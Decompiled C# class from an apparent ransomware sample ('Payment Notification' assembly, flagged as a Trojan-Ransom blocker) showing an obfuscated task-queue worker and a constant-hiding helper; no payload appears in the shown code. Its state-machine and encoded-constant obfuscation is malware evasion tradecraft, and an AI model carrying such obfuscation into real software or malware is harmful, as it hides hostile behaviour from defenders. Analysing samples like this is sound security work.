// Decompiled with JetBrains decompiler
// Type: 
// Assembly: Payment Notification, Version=98.0.1.8107, Culture=neutral, PublicKeyToken=null
// MVID: FA79794C-3025-C735-E6EB-7AA05AC66D58
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-Ransom.MSIL.Blocker.gen-9edc14cb7b9c966a121bf2b954dc49826435e452a4b161242d42fda789ed45da.exe

using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Threading;
using System.Threading.Tasks;

internal class \uE00A : IDisposable
{
  private string \uE000 = \uE00B.\uE000(32264);
  private BlockingCollection<\uE009> \uE001 = new BlockingCollection<\uE009>();

  internal \uE00A(int _param1, string[] _param2)
  {
label_10:
    int num1 = \uE00C.\uE004(26);
    int num2 = -30;
label_2:
    int index;
    while (true)
    {
      num2 ^= 13;
label_4:
      int num3 = \uE013.\uE024(35);
      while (true)
      {
        switch ((num3 ^ 22) + 13)
        {
          case 0:
label_5:
            num2 = \uE013.\uE024(23);
            num3 = -29;
            continue;
          case 1:
            switch (num2 + 19)
            {
              case 0:
                switch (num1)
                {
                  case 20:
                    index = 0;
                    num1 = 1;
                    goto label_1;
                  case 21:
                    num1 = 3;
                    goto label_1;
                  case 22:
                    goto label_14;
                  default:
                    goto label_9;
                }
              case 1:
                goto label_10;
              case 2:
label_1:
                num1 ^= 23;
                goto label_5;
              default:
                num3 = -27;
                continue;
            }
          case 2:
            goto label_2;
          default:
            goto label_4;
        }
      }
label_9:
      num2 = -29;
    }
label_14:
    for (; (index >= _param1 ? 0 : 1) != 0; ++index)
      Task.Factory.StartNew(new Action<object>(this.\uE003), (object) _param2[index], TaskCreationOptions.LongRunning);
  }

  internal void \uE000() => this.\uE001.CompleteAdding();

  internal Task \uE001(object _param1)
  {
label_8:
    int num1 = \uE013.\uE024(28);
    int num2 = 8;
label_2:
    Task task;
    while (true)
    {
      num2 ^= 45;
label_4:
      int num3 = \uE00F.\uE021(45);
      while (true)
      {
        switch (num3 ^ 39)
        {
          case 40:
            switch (num2)
            {
              case 35:
                goto label_8;
              case 36:
                switch (num1 + 27)
                {
                  case 0:
                  case 2:
                    goto label_12;
                  case 1:
                    task = this.\uE002(new CancellationToken?(), _param1);
                    num1 = -59;
                    goto label_1;
                  default:
                    goto label_10;
                }
              case 37:
label_1:
                num1 ^= 32;
                goto label_7;
              default:
                num3 = 14;
                continue;
            }
          case 41:
label_7:
            num2 = \uE013.\uE024(43);
            num3 = 13;
            continue;
          case 42:
            goto label_2;
          default:
            goto label_4;
        }
      }
label_10:
      num2 = 14;
    }
label_12:
    return task;
  }

  internal Task \uE002(CancellationToken? _param1, object _param2)
  {
label_10:
    int num1 = \uE00F.\uE021(44);
    int num2 = -28;
label_2:
    Task task;
    while (true)
    {
      num2 ^= 43;
label_4:
      int num3 = \uE013.\uE024(23);
      while (true)
      {
        switch ((num3 ^ 46) + 50)
        {
          case 0:
            switch (num2 + 51)
            {
              case 0:
                TaskCompletionSource<object> completionSource;
                switch (num1 + 40)
                {
                  case 0:
                    completionSource = new TaskCompletionSource<object>();
                    num1 = -6;
                    goto label_1;
                  case 1:
                    this.\uE001.Add(new \uE009(completionSource, _param1, _param2));
                    num1 = -7;
                    goto label_1;
                  case 2:
                    num1 = -8;
                    goto label_1;
                  case 3:
                    task = (Task) completionSource.Task;
                    num1 = -1;
                    goto label_1;
                  case 4:
                  case 5:
                    goto label_15;
                  default:
                    goto label_9;
                }
              case 1:
                goto label_10;
              case 2:
label_1:
                num1 ^= 35;
                goto label_7;
              default:
                num3 = -31;
                continue;
            }
          case 1:
label_7:
            num2 = \uE00F.\uE021(54);
            num3 = -2;
            continue;
          case 2:
            goto label_2;
          default:
            goto label_4;
        }
      }
label_9:
      num2 = -27;
    }
label_15:
    return task;
  }

  private void \uE003(object _param1)
  {
    IEnumerator<\uE009> enumerator = this.\uE001.GetConsumingEnumerable().GetEnumerator();
    try
    {
label_21:
      while ((!enumerator.MoveNext() ? 0 : 1) != 0)
      {
        \uE009 current = enumerator.Current;
        if (((!current.\uE001.HasValue ? 1 : 0) != 0 || !current.\uE001.Value.IsCancellationRequested ? 1 : 0) == 0)
        {
          current.\uE000.SetCanceled();
        }
        else
        {
          try
          {
            this.\uE004(current.\uE002);
label_10:
            int num1 = \uE00A.\uE005(66);
            int num2 = -1;
            while (true)
            {
              switch ((num2 ^ 53) + 56)
              {
                case 0:
                  switch (num1)
                  {
                    case 60:
                      num1 = 125;
                      goto label_5;
                    case 61:
                      num1 = 0;
                      goto label_5;
                    case 62:
                      current.\uE000.SetResult(current.\uE002);
                      num1 = 124;
                      goto label_5;
                    case 63:
                      num1 = \uE00A.\uE005(59);
                      goto label_5;
                    case 64:
                      goto label_21;
                    default:
                      num2 = -4;
                      continue;
                  }
                case 1:
                  goto label_10;
                case 2:
label_5:
                  num1 ^= 64;
                  break;
              }
              num2 = \uE00A.\uE005(62);
            }
          }
          catch (Exception ex)
          {
label_17:
            int num = \uE00A.\uE005(64);
            while (true)
            {
              switch (num ^ 61)
              {
                case 59:
                  num = 3;
                  continue;
                case 60:
                  num = 6;
                  continue;
                case 61:
                  current.\uE000.SetException(ex);
                  num = \uE00A.\uE005(61);
                  continue;
                case 62:
                  goto label_21;
                default:
                  goto label_17;
              }
            }
          }
        }
      }
    }
    finally
    {
      if ((enumerator == null ? 1 : 0) == 0)
        enumerator.Dispose();
    }
  }

  void IDisposable.Dispose() => this.\uE001.Dispose();

  private void \uE004(object _param1)
  {
label_10:
    int num1 = \uE013.\uE024(19);
    int num2 = 120;
label_2:
    while (true)
    {
      num2 ^= 59;
label_4:
      int num3 = \uE00C.\uE005(69);
      while (true)
      {
        switch ((num3 ^ 71) + 64)
        {
          case 0:
label_5:
            num2 = \uE00C.\uE005(73);
            num3 = -123;
            continue;
          case 1:
            switch (num2)
            {
              case 65:
                string str;
                switch (num1 + 60)
                {
                  case 0:
                    num1 = \uE00A.\uE005(57);
                    goto label_1;
                  case 1:
                    str = (string) _param1;
                    num1 = -16;
                    goto label_1;
                  case 2:
                    Console.WriteLine(str);
                    num1 = -13;
                    goto label_1;
                  case 3:
                    string.Format(this.\uE000, (object) str);
                    num1 = -15;
                    goto label_1;
                  case 4:
                    goto label_14;
                  default:
                    goto label_9;
                }
              case 66:
                goto label_10;
              case 67:
label_1:
                num1 ^= 55;
                goto label_5;
              default:
                num3 = -121;
                continue;
            }
          case 2:
            goto label_2;
          default:
            goto label_4;
        }
      }
label_9:
      num2 = 121;
    }
label_14:;
  }

  internal static int \uE005(int _param0)
  {
    switch (_param0 - ((--68223914 >> 1) - 34111900))
    {
      case 0:
        return ~-(-340560802 - 294975750 ^ -635536552);
      case 2:
        return -(218880131 - 218880383) >> 1;
      case 3:
        return ~(178230135 ^ 42835397) << 2 ^ 541604545;
      case 4:
        return 205739116 - 135696972 >> 3 ^ 8755269;
      case 5:
        return ~(--271375303 - 271375301);
      case 6:
        return -144 >> 4;
      case 7:
        return 713854457 - 713854457;
      case 8:
        return -~996380164 - 631684847 - 267799100 ^ -96896210;
      case 9:
        return (864576348 - 554730893 ^ -162396525) + 165069528 ^ -302211509;
      default:
        return --34435269 - 34435271 >> 1;
    }
  }
}
